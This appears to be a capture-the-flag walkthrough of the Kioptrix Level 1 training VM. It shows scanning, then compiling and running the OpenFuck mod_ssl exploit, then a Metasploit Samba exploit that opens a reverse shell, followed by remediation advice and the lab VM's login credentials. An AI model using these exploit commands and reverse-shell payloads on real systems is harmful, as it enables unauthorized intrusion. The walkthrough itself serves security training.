# Kioptrix: Level 1

A walkthrough of [Kioptrix: Level 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/) from VulnHub, a beginner-friendly boot2root VM used for practicing penetration testing fundamentals.

## Lab Setup

- **Attacker:** Kali Linux (VMware)
- **Target:** Kioptrix Level 1 (imported into UTM on a MacBook M4)
- **Network:** Both VMs set to **Bridged** networking, so the attacker and target appear as independent peer devices on the local network with their own IPs. Since the Kali box was already running in VMware, bridging the target's interface made it simplest for the two to reach each other.

<img width="468" height="281" alt="Image" src="https://github.com/user-attachments/assets/ebdf0d67-519a-4bde-9423-80dce34ef2bf" />

## 1. Host Discovery

With Kali on the bridged network and updated, the target's IP was identified using `netdiscover`:

```bash
netdiscover -r <IP range>
```

## 2. Scanning

An Nmap scan was run against the target to enumerate services, versions, OS, and known vulnerabilities:

```bash
nmap -sV -O -v -Pn --script vuln <target IP>
```

<img width="468" height="315" alt="Image" src="https://github.com/user-attachments/assets/9fd8827c-1303-4544-a522-e656262aaa79" />

<img width="468" height="160" alt="Image" src="https://github.com/user-attachments/assets/0ad977b1-e1ad-473d-8705-90ccf31a1301" />

<img width="468" height="294" alt="Image" src="https://github.com/user-attachments/assets/96cea57d-b597-4a87-8029-8d488e49c913" />

<img width="468" height="252" alt="Image" src="https://github.com/user-attachments/assets/870267a9-a315-4585-a306-f5aeb2cd139f" />

<img width="468" height="135" alt="Image" src="https://github.com/user-attachments/assets/7cc15fe8-bbb0-442b-88d9-13a37f672508" />


## 3. Enumerating Exploits

Findings were cross-referenced with Searchsploit and Metasploit across the open ports:

| Port | Service | Result |
|------|---------|--------|
| 22   | SSH     | False positive |
| 443  | HTTPS   | False positive |
| 111  | RPC     | False positive |
| 80   | HTTP    | **Exploitable** |
| 139  | SMB (Samba) | **Exploitable** |

## 4. Exploiting Port 80 (Apache/mod_ssl — OpenFuck)

The relevant exploit was located and copied out locally:

```bash
searchsploit -m unix/remote/764.c
```

<img width="468" height="172" alt="Image" src="https://github.com/user-attachments/assets/547591fc-253b-410b-bcd6-6108e33a6eca" />

Compiled the exploit:

```bash
gcc 764.c -o 764
```

Ran it against the target:

```bash
./764 0x6b <target IP> 433 -c 50
```

> **Note:** Output will vary slightly between runs/environments.

<img width="468" height="207" alt="Image" src="https://github.com/user-attachments/assets/116c6b73-2c23-4d83-b1ad-bf3968dcb3ad" />

> **Troubleshooting tip:** if the exploit pulled from Searchsploit doesn't compile or run cleanly, [this guide](https://monkeydouy.medium.com/how-to-compile-openfuckv2-c-69e457b4a1d1) covers fixing common OpenFuck v2 compilation issues. Other GitHub repos with patched versions of the exploit are also worth checking.

## 5. Exploiting Port 139 (Samba)

Using Metasploit against the SMB/Samba service:

<img width="468" height="221" alt="Image" src="https://github.com/user-attachments/assets/5a66af81-29b9-4472-9766-97c175243488" />

<img width="468" height="72" alt="Image" src="https://github.com/user-attachments/assets/b09752d2-1e5d-4922-8493-6d58fd1ee1d6" />


Configured and ran the exploit:

```
set RPORT <target port>
set PAYLOAD linux/x86/shell_reverse_tcp
set LPORT 4444
run
```
<img width="468" height="129" alt="Image" src="https://github.com/user-attachments/assets/a7d4ba04-78d6-4e09-ab3b-317cb78fef8d" />

# Remediation:

## Apache/mod_ssl "OpenFuck" (CVE-2002-0082)
Keep Apache, mod_ssl, and OpenSSL on current patched versions — this is a buffer overflow in old SSL handshake handling that's been fixed for over two decades. Beyond patching, disable legacy protocols (SSLv2, SSLv3, TLS 1.0/1.1) entirely in the server config, since they carry known structural weaknesses independent of any single CVE.

## Samba
Update to a current Samba release, and never expose SMB directly to the internet — restrict it to your internal network range at the service/firewall level. If a host doesn't actually need file sharing, remove Samba rather than leaving it installed and unpatched.

---

*Incase you would want to log in to the Kioptrix Level 1 Vulnerable Machine, you can use the below credentials:*

*User: john*

*Pass: TwoCows2*

*Practiced on Kioptrix: Level 1 — a deliberately vulnerable VM intended for authorized security training and CTF practice.*
